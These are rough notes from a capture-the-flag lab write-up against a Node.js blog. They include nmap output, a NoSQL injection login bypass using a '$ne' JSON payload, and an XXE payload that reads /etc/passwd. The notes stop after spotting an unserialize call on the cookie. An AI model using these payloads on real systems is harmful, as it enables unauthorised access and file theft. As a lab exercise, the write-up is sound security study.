# Recon
```
$ sudo nmap -p- --min-rate 10000 10.10.11.139                       
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-26 03:03 EEST
Warning: 10.10.11.139 giving up on port because retransmission cap hit (10).
Stats: 0:00:57 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 99.99% done; ETC: 03:04 (0:00:00 remaining)
Nmap scan report for 10.10.11.139
Host is up (1.1s latency).
Not shown: 55207 closed tcp ports (reset), 10326 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp

Nmap done: 1 IP address (1 host up) scanned in 59.03 seconds
```
- we try to open the webpage with port 5000 and try tcp scan with version scan
```
└─$ sudo nmap -p22,5000 -sCV 10.10.11.139
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-26 03:21 EEST
Nmap scan report for 10.10.11.139
Host is up (0.100s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ea8421a3224a7df9b525517983a4f5f2 (RSA)
|   256 b8399ef488beaa01732d10fb447f8461 (ECDSA)
|_  256 2221e9f485908745161f733641ee3b32 (ED25519)
5000/tcp open  http    Node.js (Express middleware)
|_http-title: Blog
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.80 seconds

```
# Shell
- The “Login” button leads to /login, which is a login form:
- we launch burp and start observing the requests
- nmap identified the site is running NodeJS with Express. The response headers confirm that
- run feroxbuster against the site and no new
- Some basic SQL injections didn’t do anything, nor did a quick sqlmap run against the login form
-  we want Node to handle the input as a JSON object
-  in response header we has Content-Type: application/x-www-form-urlencoded we change it to application/json
-  we launch burp and start modifying the request
-  since its node its likely to run nosql so we try payloadsALlTheTHings repo for nosql
-  we send this payload **({"user": "admin", "password": {"$ne": "wrongpassword"}})** send it to the repeater and yes we got a cookie so we are logged in
-  we try to login by intercept in wrong pass request again by burp and put payload and change format to json forward the request and we are logged in
-  there is and upload button when i try to upload somethingits says **Invalid XML Example: Example DescriptionExample Markdown**
-  Looking at the response, it’s a bit clearer
-  The site is clearly accepting XML and parsing that into the form to display back to me
-  opportunity for an XML External Entity (XXE) injection
-  PayloadsAllTheThings has a lot of example payloads for XXE as well
-  grab the first one and try to read /etc/passwd. I can’t just submit it as is though
-  have to work from the template that the site is expecting
```
<?xml version="1.0"?>
<!DOCTYPE data [
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<post>
        <title>0xdf's Post</title>
        <description>Read File</description>
        <markdown>&file;</markdown>
</post>
```
- This defines the entity &file; as the contents of /etc/passwd, and then references it in the markdown field. When I submit this, it works
-  found myself trying to crash the site. Errors in the XML just lead to the example payload.
-  Errors in the urls give simple messages like Cannot GET /a. One thing that did work was sending busted JSON to to /login
-  seems the source for the webapp is running in /opt/blog
-  find the source for the application at /opt/blog/server.js
-  server.js is a common name for a Node application
-  server.js is a common name for a Node application
-  The unserialize function is being called on c, which is likely the cookie. Looking at the cookie, it’s clearly URL encoded JSON
```
%7B%22user%22%3A%22admin%22%2C%22sign%22%3A%2223e112072945418601deb47d9a6c7de8%22%7D
```
- decoding to
```
{"user":"admin","sign":"23e112072945418601deb47d9a6c7de8"}
```
